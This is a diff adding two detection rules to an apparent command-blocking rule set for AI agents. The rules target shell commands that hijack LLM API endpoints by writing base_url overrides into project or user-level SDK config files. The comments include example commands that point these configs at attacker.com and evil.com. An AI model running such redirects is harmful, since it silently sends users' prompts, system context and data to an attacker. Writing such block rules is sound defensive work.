@@ -2029,6 +2029,70 @@ rules:
   # OWASP LLM06 — Excessive Agency
   # MITRE T1046 — Network Service Discovery (exposed port enables scanning)
   # MITRE T1571 — Non-Standard Port
+  # ===================================================================
+  # LLM API ENDPOINT HIJACKING — CONFIG FILE REDIRECT
+  # Taxonomy: data-exfiltration/llm-data-flow/llm-api-endpoint-hijacking
+  # OWASP LLM02 — Sensitive Information Disclosure, LLM08 — Vector/Embedding
+  # MITRE T1565.001 — Stored Data Manipulation, T1071.001 — Web Protocols
+  # ===================================================================
+
+  # === BLOCK: Writing base_url/api_base override to LLM SDK config files (LLM02) ===
+  #
+  # LLM frameworks (LiteLLM, LangChain, OpenAI SDK) load base URLs from
+  # project-level config files. Writing a `base_url` or `api_base` key to
+  # litellm_config.yaml, pyproject.toml, or similar config files redirects
+  # ALL LLM API calls in the project — intercepting prompts, system context,
+  # and RAG data sent to the model — without touching environment variables.
+  #
+  # This persists across all processes that load the config file, including
+  # CI pipelines, other developers' machines sharing the repo, and automated
+  # agent runs.
+  #
+  # Targeted config files:
+  #   litellm_config.yaml / litellm.yaml — LiteLLM proxy/client config
+  #   pyproject.toml                      — Python project config (tool.openai)
+  #   config.yaml / model_config.yaml     — Generic LLM framework configs
+  #
+  # Examples:
+  #   echo "base_url: https://attacker.com/v1" >> litellm_config.yaml
+  #   printf '[tool.openai]\nbase_url = "http://evil.com"' >> pyproject.toml
+  #
+  # Note: .env file writes are already covered by sc-block-ai-endpoint-dotenv-write
+  # in supply-chain.yaml. This rule covers non-.env LLM config files.
+  #
+  # OWASP LLM02, LLM08; MITRE T1565.001
+  - id: "ne-block-llm-configfile-endpoint-hijack"
+    taxonomy: "data-exfiltration/llm-data-flow/llm-api-endpoint-hijacking"
+    match:
+      command_regex: "(echo|printf|tee)\\s+.*\\b(base_url|api_base)\\s*[=:]\\s*[\"']?(https?://).*>>?\\s*(litellm[_-]config\\.ya?ml|litellm\\.ya?ml|pyproject\\.toml|model_config\\.ya?ml)"
+    decision: "BLOCK"
+    confidence: 0.90
+    reason: "Writing base_url or api_base override to an LLM SDK config file — persists endpoint redirect across all sessions and processes loading the config, silently intercepting all LLM calls including system prompts, RAG context, and agent state (OWASP LLM02/LLM08, MITRE T1565.001)."
+
+  # === BLOCK: Writing LLM API endpoint overrides to user-level SDK config dirs (LLM02) ===
+  #
+  # OpenAI, Anthropic, and LiteLLM SDKs may load base URLs from user-level
+  # config directories (~/.openai.json, ~/.config/litellm/config.yaml).
+  # Writing attacker-controlled base_url values here redirects all LLM calls
+  # across every project on the machine — a machine-wide persistent redirect.
+  #
+  # This is more dangerous than project-level config writes because it affects
+  # ALL projects and sessions on the user's machine without any per-project
+  # indicator of compromise.
+  #
+  # Examples:
+  #   echo '{"base_url":"https://attacker.com/v1"}' > ~/.openai.json
+  #   echo "base_url: https://evil.com" >> ~/.config/litellm/config.yaml
+  #
+  # OWASP LLM02, LLM08; MITRE T1565.001, T1552.004
+  - id: "ne-block-llm-userconfig-endpoint-hijack"
+    taxonomy: "data-exfiltration/llm-data-flow/llm-api-endpoint-hijacking"
+    match:
+      command_regex: "(echo|printf|tee)\\s+.*\\b(base_url|api_base)\\s*[=:\"']\\s*(https?://).*[>|].*~/?\\.(?:openai\\.json|config/(?:litellm|openai|anthropic)/)"
+    decision: "BLOCK"
+    confidence: 0.88
+    reason: "Writing LLM base_url override to user-level SDK config directory — machine-wide persistent redirect of all LLM API calls to attacker-controlled infrastructure, affecting all projects and sessions on this machine (OWASP LLM02/LLM08, MITRE T1565.001, T1552.004)."
+
   - id: "ne-block-unauthenticated-llm-endpoint"
     taxonomy: "data-exfiltration/llm-data-flow/unauthenticated-llm-endpoint"
     match:
